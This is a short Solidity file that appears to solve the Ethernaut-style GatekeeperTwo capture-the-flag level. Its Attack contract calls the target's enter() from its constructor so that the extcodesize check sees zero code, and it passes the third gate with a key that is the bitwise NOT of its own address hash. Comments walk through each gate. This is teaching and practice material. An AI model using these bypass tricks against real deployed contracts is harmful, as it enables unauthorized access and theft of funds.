// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IGatekeeperTwo {
  function enter(bytes8)external returns(bool);
}

contract Attack{
    constructor(IGatekeeperTwo gate){
      /*
      *to pass gateOne we have to call the Gatekeeper form another contract
      *to pass gateTwo we have to call the Gatekeeper contract from constructor when extcodesize==0
      *to pass gateThree we use NOT operator to get a key for the gate
      *we are using NOT operator to get completly opposite value of the bytes8(keccak256(abi.encodePacked(address(this)))),
      *so when using XOR we get type(uint64).max
      */
        bytes8 key=(~bytes8(keccak256(abi.encodePacked(address(this)))));
        gate.enter(key);
}
}